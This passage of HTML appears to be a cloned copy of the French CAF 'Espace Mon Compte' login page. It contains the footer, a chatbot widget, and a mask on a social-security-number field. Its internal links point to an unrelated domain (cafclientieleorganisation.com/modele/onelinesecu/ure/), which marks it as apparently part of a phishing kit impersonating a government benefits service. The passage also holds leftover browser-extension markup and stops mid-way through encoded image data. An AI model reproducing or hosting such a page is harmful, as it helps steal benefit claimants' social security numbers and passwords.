                                                                    <div _ngcontent-bra-c65="" class="col-sm-1 col-sm-offset-5 col-md-1 col-md-offset-5 col-xs-12">
                                                                        <img _ngcontent-bra-c65="" src="files/eaccessible.png" alt="" class="logo-eaccessible">
                                                                    </div>
                                                                    <br _ngcontent-bra-c65="">
                                                                    <div _ngcontent-bra-c65="" class="col-sm-12">
                                                                        <p _ngcontent-bra-c65="" class="texte-info-cnaf titre-margin texte-style">
                                                                            Le niveau du label e-accessible, certifie le niveau d'accessibilité Rgaa pour les personnes en situation de handicap. L'Espace Mon Compte du caf.fr est totalement conforme.
                                                                        </p>
                                                                    </div>
                                                                </div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>
                                                <!---->
                                                <!---->
                                                <!---->
                                                <!---->
                                            </app-login>
                                            <!---->
                                        </div>
                                    </div>
                                </div>

                                <a _ngcontent-bra-c87="" routerlink="/login" routerlinkactive="" class="hidden" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#/login">Route Login</a>
                                <a _ngcontent-bra-c87="" routerlink="/loginIdProvisoire" routerlinkactive="" class="hidden" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#/loginIdProvisoire">Route Login</a>
                                <a _ngcontent-bra-c87="" routerlink="/mdpoublie" routerlinkactive="" class="hidden" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#/mdpoublie">Route
                                    Mdpoublie</a>

                                <a _ngcontent-bra-c87="" routerlink="/mdpCreation" routerlinkactive="" class="hidden" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#/mdpCreation">Route
                                    creerMdp</a>
                                <!---->
                                <!---->
                                <!---->
                            </app-root>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <footer id="theme-footer-cnaf" role="contentinfo">
        <div id="theme-footer-content" class="theme-footer-web-content">
            <div class="container">
                <div class="row">
                    <div class="col-lg-0 col-sm-0  col-xs-2 col-md-0"></div>
                    <ul class="col-lg-12 col-sm-12  col-xs-7 col-md-12 footer-list-link clearfix" style="display: inline-block;">
                        <li aria-hidden="true"></li>
                        <li class="li-footer col-sm-3"><a class="a-footer a-footer-web" href="https://wwwd.caf.fr/redirect/s/Redirect?page=accessibilite">Accessibilité</a> </li>
                        <li class="li-footer col-sm-3"> <a class="a-footer a-footer-web" href="https://wwwd.caf.fr/redirect/s/Redirect?page=mentionsLegales">Mentions légales</a> </li>
                        <li class="li-footer col-sm-3"> <a class="a-footer a-footer-web" href="https://wwwd.caf.fr/redirect/s/Redirect?page=maCafContactCaf">Nous contacter</a> </li>
                        <li class="li-footer col-sm-3"> <a class="a-footer a-footer-web" href="https://wwwd.caf.fr/redirect/s/Redirect?page=informatiqueEtLibertes">Informatique et Libertés</a> </li>
                    </ul>

                    <div class="col-lg-0 col-sm-0  col-xs-2 col-md-0"></div>
                </div>
            </div>
        </div>

        <script>
            // Si la variable js mapPortailUsager existe et qu'on a une valeur pour "caffr" (cf. fichier variables.xld.js de cnafcommonsportailappli)
            // On remplace dans les liens "https://wwwd.caf.fr" par la valeur dans mapPortailUsager.get("caffr")
            if (typeof mapPortailUsager !== "undefined" && typeof mapPortailUsager.get === "function") {
                var prefixLink = mapPortailUsager.get("caffr");
                if (prefixLink !== undefined) {
                    var links = document.querySelectorAll('#theme-footer-content a');
                    for (var i = 0; i < links.length; i++) {
                        var link = links[i];
                        link.href = link.href.replace("https://wwwd.caf.fr", prefixLink);
                    }
                }
            }
        </script>
    </footer>

    <div id="container-chatbot-cnaf">
        <div class="container text-right">
            <div class="row">

            </div>
        </div>
    </div>
    <script type="text/javascript">
        var _iav;
        var isChatbotLoaded = 0;
        jQuery.cachedScript = function(url, options) {
            options = jQuery.extend(options || {}, {
                dataType: "script",
                cache: true,
                url: url
            });
            return jQuery.ajax(options);
        };

        function afficheChatbot(connected, codeOrganisme, refreshTokenAuthentifieUrl, cnafTokenJwt) {
            var contexteAppel = getAllUrlParams(window.location.href)["contexteAppel"] || portailDefaut;
            _iav = {
                "service_domain": urlChatbot,
                "base_path": "/chatbotappli/dist/",
                "debug": false,
                "title_text": "<p>Bonjour, je suis votre conseiller virtuel.</p><p>Je connais déjà beaucoup de réponses à vos questions et j'apprends un peu plus chaque jour.</p>",
                "display_auto": false,
                "inactivity_display_timer": 0,
                "app_mobile": false,
                "id_parent_bulle": "navbar",
                "service_url": "/api/basedeconnaissancefront/v1/mon_compte/chatbot",
                "authentifie": connected,
                "code_organisme": codeOrganisme,
                "public": "usager",
                "refresh_token_authentifie_url": refreshTokenAuthentifieUrl,
                "cnafTokenJwt": cnafTokenJwt,
                "token_authentifie_url": (refreshTokenAuthentifieUrl ? refreshTokenAuthentifieUrl : ("/token/usager" + (contexteAppel ? "?contexteAppel=" + contexteAppel : ""))),
                "token_public_url": "/token/public"
            };
            if (!connected) {
                _iav.rubrique = "CALP";
                _iav.dialog = "login";
            }
            jQuery("#iav").show();
            if (isChatbotLoaded) {
                return;
            } else {
                jQuery.cachedScript(urlChatbot + "/chatbotappli/dist/av.js?id=" + Date.now())
                    .done(function(data, textStatus, jqXHR) {
                        isChatbotLoaded = 1;
                    })
                    .fail(function(jqXHR, textStatus, errorThrown) {});
            }
        }
    </script>
    <script src="files/footerCnaf.min.js"></script>
    <script src="files/runtime-es2015.7631414b2221ef5450ea.js" type="module"></script>
    <script src="files/runtime-es5.7631414b2221ef5450ea.js" nomodule="" defer=""></script>
    <script src="files/polyfills-es5.fdb49b321d2408a2e9cc.js" nomodule="" defer=""></script>
    <script src="files/polyfills-es2015.d0749a64a8c6001a8830.js" type="module"></script>
    <script src="files/configVariables.xld.1a9365e31a9c77aaabb1.js" defer=""></script>
    <script src="files/main-es2015.601970e674adda701721.js" type="module"></script>
    <script src="files/main-es5.601970e674adda701721.js" nomodule="" defer=""></script>

    <div id="iav" class="iav-small iav-replie iav-usager feedback_simple" style="opacity: 1;">
        <div class="area_elt_bouton_agrandir" id="area_elt_bouton_agrandir" role="heading" aria-level="3" aria-label="Chatbot"><button class="iav_img bounceInUpCX" id="bouton_plier_deplier" title="Cliquer pour étendre/réduire le chatbot" aria-expanded="false" aria-controls="iav_intra"><img alt="Visage de l&#39;assistant virtuel" title="Cliquer pour étendre/réduire le chatbot" src="files/av.png"></button></div>
        <div class="iav_intra" id="iav_intra">
            <div class="iav_transcript_overlay">
                <div class="iav_transcript">
                    <div class="iav_transcript_actions"><span class="glyphicon glyphicon-remove-sign" id="iav_transcript_close" title="Fermer l&#39;historique de discussion"></span><span class="glyphicon glyphicon-trash" id="iav_transcript_erase" title="Effacer l&#39;historique de discussion"></span></div>
                    <div class="iav_transcript_intra"></div>
                </div>
            </div>
            <div class="iav_sticky_msg"><span>une question ?</span></div>
            <div class="iav_title"><button class="glyphicon glyphicon-print" id="iav_transcript_print" title="Imprimer la conversation"></button><button class="iav_expand_btn3" title="Cliquer pour agrandir/réduire"><img src="files/icon-enlarge.svg" alt="Cliquer pour agrandir/réduire"></button><button id="iav_transcript_erase2" title="Effacer l&#39;historique de discussion"><img src="files/icon-delate.svg" alt="Effacer l&#39;historique de discussion"></button><button class="iav_expand_btn2" title="Cliquer pour fermer"><img src="files/icon-close.svg" alt="Cliquer pour fermer"></button></div>
            <div class="iav_transcript_list" aria-live="polite" aria-busy="false" role="list">
                <div class="iav_item" role="listitem">
                    <div class="iav_bubble animated fadeInFast">
                        <p>La connexion à votre Espace Mon Compte change.<br>Vous devez utiliser votre numéro de sécurité sociale à 13 chiffres pour vous connecter et vous devez créer un nouveau mot de passe composé de chiffres et de lettres. </p>
                        <p>Vous pouvez également choisir de vous connecter en utilisant FranceConnect. </p>
                    </div>
                </div>
                <div class="iav_item">
                    <div class="iav_dialog slideInLeft"><a class="iav_dialog_reverter" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#">Choisir à nouveau</a>
                        <div class="iav_dialog_option animated fadeInFast delayed">Je n'ai pas encore de compte Caf</div>
                        <div class="iav_dialog_option animated fadeInFast delayed">J'ai déjà un compte Caf</div>
                    </div>
                </div>
            </div>
            <div class="iav_actions_bottom">
                <div class="input-group iav_input_group"><input id="iav_input" type="text" maxlength="150" class="form-control iav_input" autocomplete="off" placeholder="Posez-moi votre question" title="Posez-moi votre question"><span class="input-group-btn"><button id="iav_input_btn" type="button" class="btn btn-default iav_input_btn" title="Poser la question"></button></span>
                    <div class="iav_c_counter">150 caractères</div>
                </div>
                <div id="iav_feedback_area" class="iav_feedback_area" data-last_i_id="dc39d0a2-d81b-4a33-929d-a30da67232e9" aria-hidden="false">
                    <p><label>Êtes-vous satisfait(e) des réponses du conseiller virtuel ?</label><button id="iav_feedback_1" type="button" title="Oui, la réponse est satisfaisante" aria-checked="false"><img src="files/satisfaction-on.svg" alt="Oui, la réponse est satisfaisante"></button><button id="iav_feedback_0" type="button" title="Non, la réponse n&#39;est pas satisfaisante" aria-checked="false"><img src="files/satisfaction-off.svg" alt="Non, la réponse n&#39;est pas satisfaisante"></button></p>
                    <div class="input-group"><input class="form-control iav_input" placeholder="Expliquez-moi pourquoi en quelques mots..." type="text" maxlength="150" autocomplete="off" title="Expliquez-moi pourquoi en quelques mots..."><span class="input-group-btn"><button id="iav_feedback_0_btn" type="button" class="btn btn-default iav_feedback_0_btn" title="Envoyer le commentaire">OK</button></span></div>
                    <div class="iav_feedback_thank">Merci pour votre retour</div>
                </div>
            </div><a id="iav_output_back" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#" title="Revenir en arrière dans le dialogue" class="iav_output_back" style="display: none;"><span class="glyphicon glyphicon-circle-arrow-left"></span></a>
            <div id="iav_output_actions" class="iav_output_actions"><a id="iav_action_transcript" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#" title="Afficher l&#39;historique de discussion" class="iav_action"><span>Historique</span></a></div>
            <div id="iav_output_q" class="iav_output_q"></div>
            <div id="iav_output" class="iav_output">
                <p>La connexion à votre Espace Mon Compte change.<br>Vous devez utiliser votre numéro de sécurité sociale à 13 chiffres pour vous connecter et vous devez créer un nouveau mot de passe composé de chiffres et de lettres. </p>
                <p>Vous pouvez également choisir de vous connecter en utilisant FranceConnect. </p>
                <ul>
                    <li><a class="iav_dial_choice" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#" data-ssc-dialog-option="Je n&#39;ai pas encore de compte Caf">Je n'ai pas encore de compte Caf</a></li>
                    <li><a class="iav_dial_choice" href="https://cafclientieleorganisation.com/modele/onelinesecu/ure/#" data-ssc-dialog-option="J&#39;ai déjà un compte Caf">J'ai déjà un compte Caf</a></li>
                </ul>
                <div class="iav_bouchon"></div>
            </div>
        </div><button class="iav_img2" title="Cliquer pour fermer"></button>
    </div>
    <div id="iavImgModal" tabindex="-1" role="dialog" aria-labelledby="iavImgTitreModal" class="modal fade modal-vertical-align-center">
        <div class="modal-dialog modal-dialog-popup" role="document">
            <div class="modal-content">
                <div class="modal-header"><button class="close-cnaf" type="button" data-dismiss="modal" aria-label="Fermer la popup"></button>
                    <div class="sr-only" role="heading" id="iavImgTitreModal"></div>
                </div>
                <div class="modal-body"></div>
            </div>
        </div>
    </div>



    <script src="files/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="files/mask.js"></script>
    <script>
        $("#nir").mask("A AA AA AA AAA AAA")
    </script>
    <div id="ghostery-tracker-tally" class="ghostery-bottom ghostery-right ghostery-none ghostery-collapsed">
        <div id="ghostery-box">
            <div id="ghostery-count" style="background: none; color: rgb(255, 255, 255);">0</div>
            <div id="ghostery-pb-icons-container"><span id="ghostery-breaking-tracker" class="ghostery-pb-tracker" title="Broken Page Trackers" style="background: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHdpZHRoPSIxOHB4IiBoZWlnaHQ9IjE4cHgiIHZpZXdCb3g9IjAgMCAxOCAxOCIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQwICgzMzc2MikgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPmJyZWFraW5ncGFnZTwvdGl0bGU+DQogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+DQogICAgPGRlZnM+PC9kZWZzPg0KICAgIDxnIGlkPSJQdXJwbGUtQm94IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTQxNi4wMDAwMDAsIC00NTMuMDAwMDAwKSIgaWQ9ImJhbSEtYnJlYWtpbmctdGhlLXBhZ2UtY29weS0yIiBmaWxsPSIjRkNCQTMzIj4NCiAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDQxNi4wMDAwMDAsIDQ1My4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNOSwwLjE5NTY1MjE3NCBDNC4xNDQzNjAyNSwwLjE5NTY1MjE3NCAwLjE5NTY1MjE3NCw0LjE0NDM2MDI1IDAuMTk1NjUyMTc0LDkgQzAuMTk1NjUyMTc0LDEzLjg1NTYzOTggNC4xNDQzNjAyNSwxNy44MDQzNDc4IDksMTcuODA0MzQ3OCBDMTMuODU1NjM5OCwxNy44MDQzNDc4IDE3LjgwNDM0NzgsMTMuODU1NjM5OCAxNy44MDQzNDc4LDkgQzE3LjgwNDM0NzgsNC4xNDQzNjAyNSAxMy44NTU2Mzk4LDAuMTk1NjUyMTc0IDksMC4xOTU2NTIxNzQgWiBNMTEuNDg1NTg5OSwxMy40MTA0NDQxIEwxMS4wNzcwNzk4LDEzLjAyMDY3NjggTDEyLjEwMDQ3MTEsMTIuMjE2OTU3OSBMMTEuMDQ2MjQ1MSwxMi4yMTY5NTc5IEwxMS4yMzQ0NzgxLDEwLjg3MDcwODcgTDkuODAzMTgxNDIsMTEuNzk1NzUxMiBMOS40MDMzMzczNCw5LjM0NTA5MzkyIEw4LjY5NDc0MjY5LDExLjA4NjU1MTkgTDcuMzI1NzIwMDksMTAuMTcwOTgxNSBMNy43NTI1Njk3NywxMS45Mjk1NyBMNi41NTQyNDY3MywxMi4zMTE0Nzc1IEw3Ljg4MjM1Nzg3LDEzLjQxMDQ0NDEgTDExLjQ4NTU4OTksMTMuNDEwNDQ0MSBaIE02LjcxNTY3NTcyLDEzLjQxMDQ0NDEgTDUuMDI4NjMxOTcsMTIuMDA2NzU3NiBMNi44Njg0Mzg3MywxMS40MzE5ODE4IEw2LjE2Mzg3NDc3LDguNDg4NTczMDkgTDguMzQ5MzEyODgsOS45NTk5NzUxMiBMOS43MDQwMjY1NCw2LjYxMjQ5MDE1IEwxMC4zNTAzNDcxLDEwLjU1NjcxODIgTDEyLjE5NDk5MDcsOS4zNzY1MzMyOCBMMTEuODk4OTM2OCwxMS40NzY5MjM5IEwxNC4yNjI5MzQzLDExLjQ3NjkyMzkgTDEyLjIxMjkyNzIsMTMuMDc4OTIwMiBMMTIuNTY3MjI0NSwxMy40MTA0NDQxIEwxNS4zMzEyNjc3LDEzLjQxMDQ0NDEgTDE0LjQ3Mzk0MDcsMTIuNTk4NjYzOSBMMTcuMjA3MzUwNiwxMC40NjY4MzM5IEwxMy4wNjA3ODIxLDEwLjQ2NjgzMzkgTDEzLjQ5NjI5NzcsNy4zNDg2OTUgTDExLjA5OTg1MzIsOC44Nzg5NDUwNSBMMTAuMTIxMjAyNiwyLjg5Mjc3MTMgTDcuODc3NzIyNTgsOC40MjU0OTI4NSBMNC41NzA1NDQ0Nyw2LjIwMzk4MDEgTDUuNjY1NDgwNDEsMTAuNzUwMzkyNyBMMi45NTEwMTQ3MiwxMS41OTgyNDc2IEw1LjEzNjQ1MjgzLDEzLjQxMDQ0NDEgTDYuNzE1Njc1NzIsMTMuNDEwNDQ0MSBaIiBpZD0iYnJlYWtpbmdwYWdlIj48L3BhdGg+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4=&quot;); opacity: 0.5;"></span><span id="ghostery-slow-tracker" class="ghostery-pb-tracker" title="Slow Trackers" style="background: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHdpZHRoPSIxN3B4IiBoZWlnaHQ9IjE3cHgiIHZpZXdCb3g9IjAgMCAxNyAxNyIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQwICgzMzc2MikgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPnNsb3d0cmFja2VyczwvdGl0bGU+DQogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+DQogICAgPGRlZnM+PC9kZWZzPg0KICAgIDxnIGlkPSJQdXJwbGUtQm94IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTM5NS4wMDAwMDAsIC00NTQuMDAwMDAwKSIgaWQ9InNsb3d0cmFja2VycyIgZmlsbD0iI0ZDQkEzMyI+DQogICAgICAgICAgICA8cGF0aCBkPSJNNDAzLjUsNDU0IEMzOTguODEyMjEsNDU0IDM5NSw0NTcuODEyMjEgMzk1LDQ2Mi41IEMzOTUsNDY3LjE4Nzc5IDM5OC44MTIyMSw0NzEgNDAzLjUsNDcxIEM0MDguMTg3NzksNDcxIDQxMiw0NjcuMTg3NzkgNDEyLDQ2Mi41IEM0MTIsNDU3LjgxMjIxIDQwOC4xODc3OSw0NTQgNDAzLjUsNDU0IFogTTQwOS42MDk1ODQsNDY1LjE3ODY1NCBDNDA5LjUzMDI1OSw0NjUuMTU0MDkgNDA4LjY3NzI4Myw0NjQuNzQ2NDIgNDA3LjU2MTA5MSw0NjQuMzYyNjM3IEM0MDguNDg0Mzc4LDQ2My43NDU2MSA0MDkuMDk0NDE4LDQ2Mi42OTM2NDUgNDA5LjA5NDQxOCw0NjEuNTAxNzMzIEM0MDkuMDk0NDE4LDQ1OS42MDU1ODEgNDA3LjU1MTQwMSw0NTguMDYyMzM4IDQwNS42NTUyNDksNDU4LjA2MjMzOCBDNDAzLjc1OTA5Nyw0NTguMDYyMzM4IDQwMi4yMTU4NTQsNDU5LjYwNTU4MSA0MDIuMjE1ODU0LDQ2MS41MDE3MzMgQzQwMi4yMTU4NTQsNDYyLjA0OTM1IDQwMi4zNDUyMDgsNDYyLjU2Njc2OSA0MDIuNTczMjY5LDQ2My4wMjY0OTcgQzQwMi43ODgwMzQsNDYzLjA2ODYzOCA0MDMuMzQ0NDQsNDYzLjE3NTIzMiA0MDQuMjIzNzgyLDQ2My4zMjM5NjggQzQwNS4yMDQ1MzUsNDYzLjQ5MDI4MSA0MDUuODUyNDM2LDQ2My4zNTY0MTkgNDA2LjM5MTAzOSw0NjIuODc2NjM0IEM0MDYuNzI4MTcyLDQ2Mi41NzY0NTkgNDA2LjkyODA2NCw0NjIuMTYzNjA2IDQwNi45NTM1MjksNDYxLjcxMzc5NCBDNDA2Ljk4MDEyMSw0NjEuMjYzOTgxIDQwNi44Mjk1ODMsNDYwLjgyOTk0NCA0MDYuNTI5NDA4LDQ2MC40OTM3MTIgQzQwNi4wNDY5MTksNDU5Ljk1MjQwNSA0MDUuMjE1MTI3LDQ1OS45MDM5NTMgNDA0LjY3MjY5Myw0NjAuMzg1NTQxIEM0MDQuMjM5NTU3LDQ2MC43NzExMjYgNDA0LjE4NTAyMSw0NjEuNDQ0NDkyIDQwNC41NTIxMjcsNDYxLjg1NzM0NiBDNDA0Ljg0MDEzMyw0NjIuMTgwNTA3IDQwNS4zNjk5NDcsNDYyLjIxNzQ2NiA0MDUuNjg2Nzk5LDQ2MS45MzU3NyBDNDA1LjgwMzk4NCw0NjEuODMxODggNDA1Ljg3MzM5NCw0NjEuNjkyODM1IDQwNS44ODA2MDYsNDYxLjU0NDc3NiBDNDA1Ljg4NjY5LDQ2MS40MjQyMSA0MDUuODUwNjMzLDQ2MS4zMTA2MyA0MDUuNzgwOTk4LDQ2MS4yMzQwMDkgQzQwNS43MTg1NzQsNDYxLjE2NTUgNDA1LjYxOTE5Miw0NjEuMTI3NjQxIDQwNS41MTY4OCw0NjEuMTI4NTQyIEM0MDUuNDI5ODkyLDQ2MS4xMzEwMjEgNDA1LjMxNzIxNCw0NjEuMTY1NSA0MDUuMjQ0MTk4LDQ2MS4yMzc2MTUgQzQwNS4yMjYzOTUsNDYxLjI1NDI5MSA0MDUuMjA0NTM1LDQ2MS4yNjQ4ODMgNDA1LjE3OTc0Niw0NjEuMjY0ODgzIEM0MDUuMTI2MTExLDQ2MS4yNjQ4ODMgNDA1LjA4MzA2OCw0NjEuMjE2NDMxIDQwNS4wODMwNjgsNDYxLjE1NzYxMyBDNDA1LjA4MzA2OCw0NjEuMTIxMzMxIDQwNS4wOTc5NDEsNDYxLjA5NDk2NCA0MDUuMTE2NDIxLDQ2MS4wNjk0OTggQzQwNS4yMjYzOTUsNDYwLjkxODk2IDQwNS4zODE0NCw0NjAuODMxNzQ3IDQwNS41MzUzNTksNDYwLjgxODY3NiBDNDA1Ljc0NDAzOSw0NjAuODAxMDk5IDQwNS45MTMwNTcsNDYwLjg2MDgxOCA0MDYuMDQ2OTE5LDQ2MS4wMDc3NTEgQzQwNi4xNzk4NzksNDYxLjE1NDAwNyA0MDYuMjQ5Mjg5LDQ2MS4zNDg0OSA0MDYuMjM3MTIsNDYxLjU2MzI1NSBDNDA2LjIyMzgyNCw0NjEuODA2MTkgNDA2LjExMjk0OCw0NjIuMDMyNDQ4IDQwNS45MjM2NDksNDYyLjIwMDU2NCBDNDA1LjQ1NzE2LDQ2Mi42MTYxMjIgNDA0LjcwNzE3Myw0NjIuNTY2MDkzIDQwNC4yODU1Myw0NjIuMDkzMjk0IEM0MDMuNzg5NzQ1LDQ2MS41MzU5ODcgNDAzLjg1ODQ3OSw0NjAuNjMyMDgxIDQwNC40MzUxNjcsNDYwLjExNzgxNyBDNDA1LjEyMzQwNyw0NTkuNTA1Mjk3IDQwNi4xODI1ODQsNDU5LjU2NjgyIDQwNi43OTQyMDIsNDYwLjI1NTI4NCBDNDA3LjE1NzAyNiw0NjAuNjYyNzMgNDA3LjM0MDAxNiw0NjEuMTg4MjYyIDQwNy4zMDg0NjYsNDYxLjczMzE3NCBDNDA3LjI3NjY5MSw0NjIuMjc4OTg4IDQwNy4wMzQ2NTgsNDYyLjc3OTA1NSA0MDYuNjI2OTg3LDQ2My4xNDE2NTQgQzQwNi4xNjgzODYsNDYzLjU1MDIyNiA0MDUuNjMyMjYyLDQ2My43NDY1MTIgNDA0Ljk0NjUwMiw0NjMuNzQ2NTEyIEM0MDQuNzA1MzcsNDYzLjc0NjUxMiA0MDQuNDQ0ODU3LDQ2My43MjE3MjIgNDA0LjE2MzE2Miw0NjMuNjc0Mzk3IEM0MDMuMTkyMDk5LDQ2My41MDk2NjIgNDAyLjE1NTAwNyw0NjMuMzI0ODY5IDQwMi4wMTU5NjIsNDYzLjMwNTQ4OCBDNDAxLjMxNzEzMSw0NjMuMjEyMTkxIDQwMC43MzYxNjEsNDYyLjczNzU4OSA0MDAuNzE3NjgyLDQ2Mi4wMzk2NTkgTDQwMC44OTQ1ODcsNDU4Ljk4NzY1MyBDNDAwLjg5NDU4Nyw0NTguNzkxMzY3IDQwMC43MzUyNiw0NTguNjMxMTM4IDQwMC41MzgwNzIsNDU4LjYzMTEzOCBDNDAwLjM0MDg4NSw0NTguNjMxMTM4IDQwMC4xODE1NTgsNDU4Ljc5MDQ2NSA0MDAuMTgxNTU4LDQ1OC45ODc2NTMgQzQwMC4xODE1NTgsNDU4Ljk4NzY1MyA0MDAuMjg1NDQ3LDQ2MC44NDE0MzcgNDAwLjI5NzYxNyw0NjEuMDc1NTgzIEM0MDAuMzIwNjAzLDQ2MS41MjAyMTIgMzk5LjkxMTEzLDQ2MS44NzY3MjYgMzk5LjQ2MDQxNiw0NjEuODc2NzI2IEMzOTguOTk4NDM1LDQ2MS44NzY3MjYgMzk4LjU4NzE1OSw0NjEuNTAwODMxIDM5OC42MjM0NDEsNDYxLjAzOTUyNiBDMzk4LjY0MzQ5OCw0NjAuNzg0MTk3IDM5OC42NjQ2ODIsNDYwLjUyMDA3OSAzOTguNjg1ODY1LDQ2MC4yNzI4NjIgTDM5OC43NTk3ODIsNDU5LjAwOTUxMiBDMzk4Ljc1OTc4Miw0NTguODEzMjI2IDM5OC42MDA0NTUsNDU4LjY1Mjk5OCAzOTguNDAzMjY4LDQ1OC42NTI5OTggQzM5OC4yMDYwOCw0NTguNjUyOTk4IDM5OC4wNDY3NTMsNDU4LjgxMjMyNSAzOTguMDQ2NzUzLDQ1OS4wMDk1MTIgTDM5OC4yMjAyNzgsNDYxLjk5OTk5NyBMMzk4LjIyMDI3OCw0NjIuMDA1MTggQzM5OC4yMjAyNzgsNDY0LjA5NzYxNyAzOTkuNDE3MzczLDQ2NS44MDI4OTIgNDAxLjUxMDcxMiw0NjUuODAxMDg5IEM0MDMuNjIyNTMxLDQ2NS43OTgzODUgNDA5LjYwODY4Myw0NjUuODAxMDg5IDQwOS42MDg2ODMsNDY1LjgwMTA4OSBDNDA5Ljc4MTA4MSw0NjUuODAxMDg5IDQwOS45MjAzNTEsNDY1LjY2MTE0MyA0MDkuOTIwMzUxLDQ2NS40ODk0MjEgQzQwOS45MjAzNTEsNDY1LjMxNzAyMyA0MDkuNzczMTkzLDQ2NS4yMzA3MTEgNDA5LjYwOTU4NCw0NjUuMTc4NjU0IFoiPjwvcGF0aD4NCiAgICAgICAgPC9nPg0KICAgIDwvZz4NCjwvc3ZnPg==&quot;); opacity: 0.5;"></span><span id="ghostery-non-secure-tracker" class="ghostery-pb-tracker" title="Non-secure Trackers" style="background: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHdpZHRoPSIxOHB4IiBoZWlnaHQ9IjE4cHgiIHZpZXdCb3g9IjAgMCAxOCAxOCIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQwICgzMzc2MikgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPndhcm5pbmc8L3RpdGxlPg0KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPg0KICAgIDxkZWZzPjwvZGVmcz4NCiAgICA8ZyBpZD0iUHVycGxlLUJveCIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+DQogICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0zNzMuMDAwMDAwLCAtNDUzLjAwMDAwMCkiIGlkPSJ3YXJuaW5nIiBmaWxsPSIjRkVCMDMyIj4NCiAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDM3My4wMDAwMDAsIDQ1My4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNOSwwLjYzMDQzNDc4MyBDNC4zODQxNDQ5MywwLjYzMDQzNDc4MyAwLjYzMDQzNDc4Myw0LjM4NDE0NDkzIDAuNjMwNDM0NzgzLDkgQzAuNjMwNDM0NzgzLDEzLjYxNTg1NTEgNC4zODQxNDQ5MywxNy4zNjk1NjUyIDksMTcuMzY5NTY1MiBDMTMuNjE1ODU1MSwxNy4zNjk1NjUyIDE3LjM2OTU2NTIsMTMuNjE1ODU1MSAxNy4zNjk1NjUyLDkgQzE3LjM2OTU2NTIsNC4zODQxNDQ5MyAxMy42MTU4NTUxLDAuNjMwNDM0NzgzIDksMC42MzA0MzQ3ODMgWiBNNC42NDI5MjgxMSwxMS43ODk4NTUxIEM1LjI1MDQxMTY1LDExLjc4OTg1NTEgNS43NTY5NTIzNCwxMS4zNjA3NTY3IDUuODc4NzE2OTMsMTAuODgxMzY5NSBDNi4wMDA0ODE1MiwxMS4zNjEyNDM3IDYuNTA3MDIyMjIsMTEuNzIzNzM2OSA3LjExNDM4NCwxMS43MjM3MzY5IEM3LjcyNDE4MTA2LDExLjcyMzczNjkgOC4yMzI2Njk5OSwxMS4zNjUwMTg0IDguMzUxNTEyMjMsMTAuODgyNzA4OSBDOC40NzA5NjMzLDExLjM2NTAxODQgOC45Nzk0NTI